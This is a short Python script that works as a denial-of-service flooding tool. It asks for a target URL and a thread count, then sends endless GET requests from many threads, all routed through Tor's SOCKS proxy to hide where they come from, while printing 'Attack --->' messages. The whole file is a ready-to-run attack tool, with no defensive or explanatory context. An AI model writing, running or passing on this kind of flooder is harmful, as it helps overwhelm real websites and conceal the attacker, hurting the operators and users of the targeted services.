import requests
import sys
import random
from threading import Thread

s = requests.session()
s.proxies = {}
s.proxies['http'] = 'socks5h://localhost:9050'
s.proxies['https'] = 'socks5h://localhost:9050'
s.proxies['socks5'] = 'socks5h://localhost:9050'

def atk():
	while True:
		ab = random.choice( ['~', '!', '@', '#', '$', '%', '&', '*'] )
		try:
			print("Attack ---> " + str(url) + " Using Tor's Network " + str(ab))
			s.get(url)
		except:
			sys.exit()

url = str(input("Target :"))
thr = int(input("Threads :"))

for i in range(thr):
	i = Thread(target=atk, name=(i))
	i.start()
